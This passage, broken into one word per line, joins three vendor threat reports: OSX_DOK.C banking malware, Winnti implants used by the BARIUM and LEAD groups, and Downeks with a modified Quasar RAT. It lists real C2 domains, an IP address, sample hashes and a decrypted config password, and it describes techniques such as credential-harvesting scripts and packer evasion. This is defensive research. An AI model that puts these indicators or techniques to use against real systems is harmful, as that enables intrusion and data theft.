.
 
However
,
once
the
victim
enters
an
account
and
password
.
 
A
window
will
pop
out
.
 
The
pop-out
window
is
just
smoke
and
mirrors
,
where
nothing
actually
happens
once
the
countdown
timer
reaches
zero
.
 
We
analyzed
the
webpage
and
found
attackers
injecting
a
script
into
the
webpage
.
 
Once
the
user
enters
an
account
and
password
,
it
will
initiate
POST
using
AJAX
.
 
The
POST
message
is
sent
to
the
same
site
as
the
fake
login
pagewhich
an
attacker
can
control
inside
the
Tor
network
.
 
We
decoded
the
data
section
and
found
not
only
the
account
and
password
,
but
that
it
also
fingerprinted
the
user
s
browser
and
system
information
.
 
While
Operation
Emmental
was
able
to
bypass
two-way
authentication
by
tricking
its
victims
into
installing
a
fake
app
,
we
have
not
observed
OSX_DOK.C
doing
this
.
 
However
,
since
they
can
inject
code
into
the
webpage
,
it
means
they
have
the
ability
to
do
this
as
well
.
 
We
performed
static
analysis
on
the
sample
and
found
it
packed
by
Ultimate
Packer
for
Executables
(
UPX
)
,
an
open
source
executable
packer
that
can
often
be
abused
by
malware
.
 
We
successfully
unpacked
the
initial
sample
we
found
dropped
by
the
UPX
unpacker
.
 
The
malware
is
not
obfuscated
so
we
easily
found
interesting
strings
here
.
 
We
can
see
that
the
malware
relies
on
bash
shell
for
most
of
its
setup
.
 
We
were
not
able
to
unpack
the
sample
discovered
after
June
9
,
2017
.
 
The
UPX
gave
a
warning
message
about
memory
buffer
overflow
.
 
The
malware
author
seemingly
made
unpacking
the
malware
more
difficult
to
slow
down
or
even
evade
the
antivirus
engine
s
scanning
process
.
 
The
packer
is
the
same
but
the
malware
tries
to
exploit
the
undiscovered
bug
in
the
UPX
library
that
causes
unpack
failure
.
 
We
have
reported
the
issues
to
the
UPX
team
,
and
they
have
already
fixed
it
.
 
The
impacted
versions
of
the
UPX
library
are
3.94
,
3.93
,
and
3.92
.
 
This
technique
enables
the
malware
to
efficiently
run
while
evading
unpacking
techniques
from
the
AntiVirus-integrated
UPX
library
.
 
As
mentioned
earlier
,
we
believe
that
OSX_DOK.C
might
be
the
MAC
OS
X
version
of
WERDLOD
,
an
online
banking
malware
that
used
the
same
techniques
as
Operation
Emmental
.
 
Other
research
have
also
connected
the
OSX
malware
and
Retefe
(
the
external
term
used
for
WERDLOD
)
via
similarities
in
their
behavior
.
 
While
OSX_DOK.C
is
designed
for
MAC
OS
X
,
which
is
a
Unix-like
system
,
WERDLOD
is
designed
for
Windows
.
 
But
in
terms
of
features
and
behaviors
,
these
two
malware
are
very
similar
.
 
Here
is
a
list
of
their
similarities
.
 
Both
malware
kill
all
current
browsers
before
installing
fake
certificates
:
Both
WERDLOD
and
OSX_DOK.C
are
designed
to
kill
the
browser
process
before
installing
fake
certificates
.
 
While
WERDLOD
kills
processes
for
Internet
Explorer
,
Firefox
,
and
Chrome
,
OSX_DOK.C
does
the
same
on
Safari
,
Firefox
,
and
Chrome
.
 
Both
malware
share
the
same
proxy
settings
and
script
:
While
WERDLOD
and
OSX_DOK.C
use
different
codes
(
since
they
target
different
operating
systems
)
,
they
have
similar
proxy
settings
and
script
formats
.
 
In
particular
,
WERDLOD
uses
scripts
running
on
http://127.0.0.1:5555/#{random_string}.js?ip=#{my_ip}
as
proxy
:
Comparing
it
to
OSX_DOK.C
,
we
can
see
that
it
uses
the
same
script
format
.
 
Both
malware
have
similar
targets
.
 
Both
WERDLOD
and
OSX_DOK.C
targeted
financial
institutions
,
with
a
particular
focus
on
banks
in
Switzerland
.
 
Further
analysis
of
both
malware
revealed
that
their
main
targets
are
very
similar
,
as
seen
in
the
screenshot
below
.
 
While
it
s
possible
that
this
is
a
coincidence
,
the
rest
of
the
evidence
makes
it
unlikely
for
these
two
malware
to
target
the
same
organizations
by
chance
.
 
Given
the
connection
between
WERDLOD
and
OSX_DOK.C
,
it
is
reasonable
to
assume
that
the
latter
is
also
a
part
of
the
Operational
Emmental
campaign
.
 
To
further
illustrate
,
here
is
a
timeline
of
Operation
Emmental
and
its
potential
relationship
to
OSX_DOK.C
:
Despite
phishing
incidents
for
Mac
devices
being
rarer
than
their
Windows
counterparts
,
users
should
still
be
aware
that
attackers
can
target
them
at
any
moment
.
 
By
implementing
best
practices
for
phishing-type
attackssuch
as
refraining
from
downloading
files
unless
they
are
absolutely
certain
that
they
come
from
trustworthy
sourcesusers
can
avoid
being
victimized
by
malware
such
as
OSX_DOK.C
that
prey
on
users
who
lack
awareness
of
phishing
strategies
.
 
In
addition
,
end
users
can
also
benefit
from
security
solutions
such
as
Trend
Micro
Home
Security
for
Mac
,
which
provides
comprehensive
security
and
multi-device
protection
against
viruses
,
ransomware
,
malicious
websites
,
and
identity
thieves
.
 
It
also
provides
secure
storage
of
passwords
and
other
sensitive
information
.
 
Trend
Micro
Mobile
Security
for
Apple
devices
(
available
on
the
App
Store
)
can
monitor
and
block
phishing
attacks
and
other
malicious
URLs
.
 
For
enterprises
,
Trend
Micro
s
Smart
Protection
Suites
with
XGen
security
,
which
support
Mac
systems
,
infuse
high-fidelity
machine
learning
into
a
blend
of
threat
protection
techniques
to
eliminate
security
gaps
across
any
user
activity
and
any
endpoint
.
 
Detecting
threat
actors
in
recent
German
industrial
attacks
with
Windows
Defender
ATP
.
 
When
a
Germany-based
industrial
conglomerate
disclosed
in
December
2016
that
it
was
breached
early
that
year
,
the
breach
was
revealed
to
be
a
professionally
run
industrial
espionage
attack
.
 
According
to
the
German
press
,
the
intruders
used
the
Winnti
family
of
malware
as
their
main
implant
,
giving
them
persistent
access
to
the
conglomerate
s
network
as
early
as
February
2016
.
 
In
this
blog
,
we
look
at
the
Winnti
malware
implant
as
used
by
two
known
activity
groups
BARIUM
and
LEAD
.
 
We
look
at
how
these
activity
groups
introduce
the
implant
to
various
targets
and
techniques
used
by
Microsoft
researchers
to
track
the
implant
.
 
To
show
how
this
breach
and
similar
breaches
can
be
mitigated
,
we
look
at
how
Windows
Defender
Advanced
Threat
Protection
(
Windows
Defender
ATP
)
flags
activities
associated
with
BARIUM
,
LEAD
,
and
other
known
activity
groups
and
how
it
provides
extensive
threat
intelligence
about
these
groups
.
 
We
go
through
the
Winnti
implant
installation
process
and
explore
how
Windows
Defender
ATP
can
capture
such
attacker
methods
and
tools
and
provide
visualized
contextual
information
that
can
aid
in
actual
attack
investigation
and
response
.
 
We
then
discuss
how
centralized
response
options
,
provided
as
enhancements
to
Windows
Defender
ATP
with
the
Windows
10
Creators
Update
,
can
be
used
to
quickly
stop
threats
,
including
stopping
command
and
control
(
C&C
)
communication
and
preventing
existing
implants
from
installing
additional
components
or
from
moving
laterally
to
other
computers
on
the
network
.
 
Microsoft
Threat
Intelligence
associates
Winnti
with
multiple
activity
groupscollections
of
malware
,
supporting
infrastructure
,
online
personas
,
victimology
,
and
other
attack
artifacts
that
the
Microsoft
intelligent
security
graph
uses
to
categorize
and
attribute
threat
activity
.
 
Microsoft
labels
activity
groups
using
code
names
derived
from
elements
in
the
periodic
table
.
 
In
the
case
of
this
malware
,
the
activity
groups
strongly
associated
with
Winnti
are
BARIUM
and
LEAD
.
 
But
even
though
they
share
the
use
of
Winnti
,
the
BARIUM
and
LEAD
activity
groups
are
involved
in
very
different
intrusion
scenarios
.
 
BARIUM
begins
its
attacks
by
cultivating
relationships
with
potential
victimsparticularly
those
working
in
Business
Development
or
Human
Resourceson
various
social
media
platforms
.
 
Once
BARIUM
has
established
rapport
,
they
spear-phish
the
victim
using
a
variety
of
unsophisticated
malware
installation
vectors
,
including
malicious
shortcut
(
.lnk
)
files
with
hidden
payloads
,
compiled
HTML
help
(
.chm
)
files
,
or
Microsoft
Office
documents
containing
macros
or
exploits
.
 
Initial
intrusion
stages
feature
the
Win32/Barlaiy
implantnotable
for
its
use
of
social
network
profiles
,
collaborative
document
editing
sites
,
and
blogs
for
C&C
.
 
Later
stages
of
the
intrusions
rely
upon
Winnti
for
persistent
access
.
 
The
majority
of
victims
recorded
to
date
have
been
in
electronic
gaming
,
multimedia
,
and
Internet
content
industries
,
although
occasional
intrusions
against
technology
companies
have
occurred
.
 
In
contrast
,
LEAD
has
established
a
far
greater
reputation
for
industrial
espionage
.
 
In
the
past
few
years
,
LEAD
s
victims
have
included
:
Multinational
,
multi-industry
companies
involved
in
the
manufacture
of
textiles
,
chemicals
,
and
electronics
.
 
Pharmaceutical
companies
.
 
A
company
in
the
chemical
industry
.
 
University
faculty
specializing
in
aeronautical
engineering
and
research
.
 
A
company
involved
in
the
design
and
manufacture
of
motor
vehicles
.
 
A
cybersecurity
company
focusing
on
protecting
industrial
control
systems
.
 
During
these
intrusions
,
LEAD
s
objective
was
to
steal
sensitive
data
,
including
research
materials
,
process
documents
,
and
project
plans
.
 
LEAD
also
steals
code-signing
certificates
to
sign
its
malware
in
subsequent
attacks
.
 
In
most
cases
,
LEAD
s
attacks
do
not
feature
any
advanced
exploit
techniques
.
 
The
group
also
does
not
make
special
effort
to
cultivate
victims
prior
to
an
attack
.
 
Instead
,
the
group
often
simply
emails
a
Winnti
installer
to
potential
victims
,
relying
on
basic
social
engineering
tactics
to
convince
recipients
to
run
the
attached
malware
.
 
In
some
other
cases
,
LEAD
gains
access
to
a
target
by
brute-forcing
remote
access
login
credentials
,
performing
SQL
injection
,
or
exploiting
unpatched
web
servers
,
and
then
they
copy
the
Winnti
installer
directly
to
compromised
machines
.
 
Microsoft
Analytics
shows
that
Winnti
has
been
used
in
intrusions
carried
out
throughout
Asia
,
Europe
,
Oceania
,
the
Middle
East
,
and
the
United
States
in
the
last
six
months
.
 
The
most
recent
series
of
attacks
observed
was
in
December
2016
.
 
Although
tracking
threats
like
Winnti
involves
old-fashioned
investigative
work
,
Microsoft
Threat
Intelligence
analysts
take
advantage
of
machine
learning
to
work
at
scale
.
 
When
attackers
used
Winnti
to
maintain
access
to
web
servers
,
they
hid
the
implant
in
plain
sight
by
masquerading
it
as
a
trusted
,
legitimate
file
.
 
This
was
the
case
in
two
known
intrusions
in
2015
,
where
attackers
named
the
implant
DLL
ASPNET_FILTER.DLL
to
disguise
it
as
the
DLL
for
the
ASP.NET
ISAPI
Filter
.
 
Although
there
are
obvious
differences
between
the
legitimate
file
and
the
malicious
one
,
filtering
out
the
malicious
file
would
involve
going
through
a
data
set
with
noise
from
millions
of
possible
file
names
,
software
publishers
,
and
certificates
.
 
Microsoft
researchers
used
a
combination
of
anomaly
detection
and
supervised
machine
learning
to
reduce
the
data
set
and
separate
meaningful
,
malware-related
anomalies
from
benign
data
.
 
Windows
Defender
ATP
helps
network
security
professionals
deal
with
intrusions
from
activity
groups
like
LEAD
and
BARIUM
in
several
ways
.
 
The
following
examples
were
developed
using
a
Winnti
installer
that
was
used
in
attacks
in
December
2016
.
 
Microsoft
Threat
Intelligence
continually
tracks
activity
groups
such
as
LEAD
and
BARIUM
and
documents
the
tactics
,
techniques
,
and
procedures
they
employ
in
their
attacks
,
with
a
special
focus
on
the
tools
and
infrastructure
they
use
to
facilitate
those
attacks
.
 
Windows
Defender
ATP
continuously
monitors
protected
systems
for
such
indicators
of
hostile
activity
and
alerts
security
operations
center
(
SOC
)
personnel
to
their
presence
.
 
To
provide
context
around
such
alerts
,
Windows
Defender
ATP
also
features
a
short
summary
of
the
group
s
history
,
goals
,
methods
,
and
tools
,
with
links
to
extensive
documentation
for
technically
minded
users
.
 
Windows
Defender
ATP
is
also
capable
of
detecting
previously
unknown
attacks
by
monitoring
system
behavior
indicative
of
hostile
activity
,
including
:
Malware
installation
,
persistence
,
and
activation
.
 
Backdoor
command
and
control
.
 
Credential
theft
.
 
Lateral
movement
to
other
machines
on
the
network
.
 
For
example
,
numerous
malware
families
register
themselves
as
services
during
installation
to
guarantee
persistence
across
reboots
.
 
A
majority
of
malware
that
perform
this
persistence
technique
modify
the
necessary
registry
keys
in
ways
that
do
not
fit
the
profile
of
a
legitimate
program
.
 
Winnti
is
no
exception
,
and
so
,
during
Winnti
s
installation
process
,
Windows
Defender
ATP
is
able
to
raise
behavioral
alerts
.
 
To
improve
coverage
while
minimizing
false
positives
,
Windows
Defender
ATP
uses
the
intelligent
security
graph
to
differentiate
between
suspicious
and
benign
behavior
before
generating
alerts
.
 
It
considers
the
age
of
the
file
,
its
global
prevalence
,
and
the
presence
and
validity
of
a
digital
signature
along
with
the
method
of
service
creation
.
 
For
alerts
raised
either
by
specific
threat
intelligence
tied
to
activity
groups
or
by
more
generic
suspicious
behaviors
,
Windows
Defender
ATP
provides
rich
,
visualized
technical
context
.
 
This
visual
context
enables
SOC
personnel
to
investigate
alerts
with
all
related
artifacts
,
understand
the
scope
of
the
breach
,
and
prepare
a
comprehensive
action
plan
.
 
In
the
screenshots
below
,
Windows
Defender
ATP
clearly
presents
the
Winnti
installation
where
an
installer
drops
a
DLL
to
disk
,
loads
the
DLL
using
rundll32
,
sets
the
DLL
as
a
service
,
and
saves
a
copy
of
itself
in
C:\Windows\Help
.
 
Windows
Defender
ATP
displays
these
activities
as
process
trees
in
a
machine
timeline
for
the
infected
computer
.
 
Analysts
can
easily
extract
detailed
information
from
these
trees
,
such
as
the
implant
DLL
dropped
by
the
installer
,
the
command
used
to
call
rundll32.exe
and
load
the
DLL
,
and
the
registry
modifications
that
set
the
DLL
as
a
service
.
 
This
information
can
provide
an
initial
means
by
which
to
assess
the
scope
of
the
breach
.
 
The
Windows
10
Creators
Update
will
bring
several
enhancements
to
Windows
Defender
ATP
that
will
provide
SOC
personnel
with
options
for
immediate
mitigation
of
a
detected
threat
.
 
If
an
intruder
compromises
a
computer
that
has
been
onboarded
to
Windows
Defender
ATP
,
SOC
personnel
can
isolate
the
computer
from
the
network
,
blocking
command
and
control
of
the
implant
and
preventing
attackers
from
installing
additional
malware
and
moving
laterally
to
other
computers
in
the
network
.
 
Meanwhile
,
connectivity
to
the
Windows
Defender
ATP
service
is
maintained
.
 
While
the
machine
is
in
isolation
,
SOC
personnel
can
direct
the
infected
machine
to
collect
live
investigation
data
,
such
as
the
DNS
cache
or
security
event
logs
,
which
they
can
use
to
verify
alerts
,
assess
the
state
of
the
intrusion
,
and
support
follow-up
actions
.
 
Another
option
is
to
simply
halt
and
quarantine
the
Winnti
implant
itself
,
stopping
the
intrusion
on
a
single
machine
.
 
LEAD
and
BARIUM
are
not
known
for
large-scale
spear-phishing
,
so
it
is
unlikely
that
SOC
personnel
would
have
to
deal
with
multiple
machines
having
been
compromised
by
these
groups
at
the
same
time
.
 
Nevertheless
,
Windows
Defender
ATP
also
supports
blocking
the
implant
across
the
entire
enterprise
,
stopping
large-scale
intrusions
in
the
early
stages
.
 
With
the
enhanced
post-breach
detection
capabilities
of
Windows
Defender
ATP
,
SOC
personnel
are
able
to
reduce
this
period
to
hours
or
even
minutes
,
significantly
lessening
the
potential
impact
of
persistent
attacker
access
to
their
network
.
 
Windows
Defender
ATP
provides
extensive
information
about
activity
groups
responsible
for
the
attacks
,
enabling
customers
to
understand
aspects
of
the
attack
that
may
not
be
obtained
by
network
and
endpoint
sensors
,
such
as
common
social
engineering
lures
and
the
regional
nature
of
an
attack
.
 
With
relevant
visualized
information
,
analysts
are
able
to
study
malware
behavior
on
impacted
machines
,
so
they
can
investigate
further
and
plan
out
their
response
.
 
Detecting
threat
actors
in
recent
German
industrial
attacks
with
Windows
Defender
ATP
.
 
Detecting
threat
actors
in
recent
German
industrial
attacks
with
Windows
Defender
ATP
.
 
Downeks
and
Quasar
RAT
Used
in
Recent
Targeted
Attacks
Against
Governments
.
 
Palo
Alto
Networks
Traps
Advanced
Endpoint
Protection
recently
prevented
recent
attacks
that
we
believe
are
part
of
a
campaign
linked
to
DustySky
.
 
DustySky
is
a
campaign
which
others
have
attributed
to
the
Gaza
Cybergang
group
,
a
group
that
targets
government
interests
in
the
region
.
 
This
report
shares
our
researchers
analysis
of
the
attack
and
Remote
Access
Tool
(
RAT
)
.
 
We
also
discovered
during
our
research
that
the
RAT
Server
used
by
this
attacker
is
itself
vulnerable
to
remote
attack
,
a
double-edged
sword
for
these
attackers
.
 
The
initial
infection
vector
in
this
attack
is
not
clear
,
but
it
results
in
installing
the
Downeks
downloader
,
which
in
turn
infects
the
victim
computer
with
the
Quasar
RAT
.
 
Downeks
uses
third
party
websites
to
determine
the
external
IP
of
the
victim
machine
,
possibly
to
determine
victim
location
with
GeoIP
.
 
It
also
drops
decoy
documents
in
an
attempt
to
camouflage
the
attack
.
 
Quasar
is
a
.NET
Framework-based
open-source
RAT
.
 
The
attackers
invested
significant
effort
in
attempting
to
hide
the
tool
by
changing
the
source
code
of
the
RAT
and
the
RAT
server
,
and
by
using
an
obfuscator
and
packer
.
 
Unit
42
researchers
observed
the
Quasar
RA
being
prevented
from
executing
on
a
Traps-protected
client
in
September
2016
.
 
We
observed
these
Quasar
samples
:
f-secure.exe
:
99a7cb43fb2898810956b6137d803c8f97651e23f9f13e91887f188749bd5e8f
connects
to
hnoor.newphoneapp.com
.
 
HD_Audio.exe
:
0c4aa50c95c990d5c5c55345626155b87625986881a2c066ce032af6871c426a
connects
to
manual.newphoneapp.com
.
 
HD_Audio.exe
:
86bd78b4c8c94c046d927fb29ae0b944bf2a8513a378b51b3977b77e59a52806
crashes
upon
execution
.
 
sim.exe
723108103ccb4c166ad9cdff350de6a898489f1dac7eeab23c52cd48b9256a42
connects
to
hnoor.newphoneapp.com
.
 
Further
research
found
other
Quasar
examples
,
an
attack
earlier
in
the
month
2016
on
the
same
target
:
SHA256
:
1ac624aaf6bbc2e3b966182888411f92797bd30b6fcce9f8a97648e64f13506f
.
 
We
found
the
same
Quasar
code
in
an
additional
attack
on
the
same
day
,
but
upon
a
different
target
.
 
A
second
Quasar
sample
was
also
observed
attacking
this
new
victim
:
SHA256
:
99a7cb43fb2898810956b6137d803c8f97651e23f9f13e91887f188749bd5e8f
.
 
We
do
not
have
detailed
visibility
into
the
specific
host
attacked
,
and
have
not
been
able
to
reproduce
the
second
stage
of
the
attack
in
our
lab
.
 
However
,
based
upon
the
timeframe
of
subsequent
telemetry
we
observe
,
we
understand
the
attack
chain
as
follows
:
The
initial
dropper
(
which
varies
across
attacks
)
is
delivered
to
the
victim
via
email
or
web
:
File
Name
:
Joint
Ministerial
Council
between
the
GCC
and
the
EU
Council.exe
.
 
SHA256
0d235478ae9cc87b7b907181ccd151b618d74955716ba2dbc40a74dc1cdfc4aa
.
 
The
initial
dropper
,
upon
execution
,
extracts
an
embedded
Downeks
instance
:
File
Name
:
ati.exe
.
 
SHA256
f19bc664558177b7269f52edcec74ecdb38ed2ab9e706b68d9cbb3a53c243dec
.
 
Downeks
makes
a
POST
request
to
dw.downloadtesting.com
,
resulting
in
the
installation
of
the
Quasar
RAT
on
the
victim
machine
.
 
Additional
Downeks
downloaders
connecting
to
the
previously-observed
server
dw.downloadtesting.com
were
also
found
in
this
attack
:
SHA256
15abd32342e87455b73f1e2ecf9ab10331600eb4eae54e1dfc25ba2f9d8c2e8a
.
 
SHA256
9a8d73cb7069832b9523c55224ae4153ea529ecc50392fef59da5b5d1db1c740
.
 
Further
research
identified
dozens
of
Dowenks
and
Quasar
samples
related
to
these
attackers
.
 
All
included
decoy
document
written
in
Arabic
(
all
related
to
Middle
Eastern
politics
)
or
Hebrew
.
 
Most
of
them
use
the
same
mutex
structure
,
share
the
same
fake
icon
and
unique
metadata
details
,
file
writes
,
registry
operations
,
and
fake
common
program
metadata
,
as
seen
in
DustySky
samples
.
 
The
Downeks
downloader
and
Quasar
C2
infrastructures
are
each
self-contained
and
independent
of
each
other
.
 
However
,
we
did
find
a
single
shared
IP
address
demonstrably
connecting
the
Downeks
downloader
and
Quasar
C2
infrastructure
.
 
We
saw
five
samples
built
on
the
same
date
in
December
2015
,
and
six
on
the
same
date
in
January
,
further
solidifying
the
link
between
each
sample
.
 
We
analyzed
a
Quasar
sample
we
found
that
was
communicating
with
an
active
C2
server
at
the
time
of
analysis
:
SHA256
:
4393ff391396cdfd229517dd98aa7faecad04da479fe8ca322f035ceee363273
.
 
Quasar
is
a
publicly-available
commodity
RAT
,
an
evolution
of
his
earlier
xRAT
,
by
German
developer
MaxXor
.
 
This
sample
is
a
modified
version
of
Quasar
,
most
likely
forked
from
open
source
version
1.2.0.0
on
GitHub
.
 
The
client
was
likely
built
using
the
Quasar
server
client
builder
.
 
We
observed
the
following
customizations
:
C2
server
:
app.progsupdate.com
,
which
resolved
to
185.141.25.68
)
,
over
port
4664
.
 
Quasar
mutex
name
:
VMFvdCsC7RFqerZinfV0sxJFo
.
 
Keylogger
log
location
:
Users\hJTQwqwwSCkZU\AppData\Roaming\GoogleDesktop\<date>
.
 
The
malware
uses
fake
version
information
to
appear
as
a
Microsoft
update
program
,
as
well
as
Google
Desktop
once
unpacked
.
 
This
sample
is
packed
by
Netz
,
a
simple
.NET
Framework
packer
which
stores
the
original
executable
compressed
(
zlib
)
as
a
resource
.
 
At
runtime
,
the
packer
decompresses
the
resource
and
uses
Reflection
to
load
the
assembly
,
find
its
Entry
point
,
and
Invoke
it
.
 
Extracting
the
payload
is
straight
forward
we
simply
dump
the
resource
and
decompress
it
.
 
We
discovered
that
the
sample
was
obfuscated
using
.NET
reactor
.
 
It
is
possible
to
decompile
the
deobfuscated
sample
and
retrieve
most
of
the
original
source
code
but
not
enough
to
compile
it
easily
.
 
After
deobfuscation
we
extracted
:
SHA256
:
d773b12894d4a0ffb0df328e7e1aa4a7112455e88945a10471650e503eecdb3d
.
 
After
decompiling
the
sample
,
we
were
able
to
document
the
modifications
from
the
open-source
Quasar
.
 
The
configuration
of
Quasar
is
stored
in
the
Settings
object
,
which
is
encrypted
with
a
password
which
is
itself
stored
unencrypted
.
 
Modifications
:
The
ISCHECKIP
and
INSTARTUPFOLDER
are
not
found
in
open
source
Quasar
samples
.
 
The
sample
we
analyzed
is
using
RijndaelManaged
with
ECB
mode
and
PKCS7
padding
.
 
The
key
is
the
SHA256
hash
of
the
hard-coded
password
.
 
The
password
of
the
sample
we
analyzed
is
:
6y7u^Y&U6y7u^Y&U6y7u^Y&U
.
 
Although
at
first
glance
this
appears
somewhat
complex
,
it
is
in
fact
a
rather
simple
,
repeated
keyboard
sequence
.
 
We
observe
similar
keyboard
patterns
in
other
samples
:
567%^&
,
zxc!@#ASD
.
 
Modifications
:
Uses
SHA256
instead
of
MD5
to
create
the
key
.
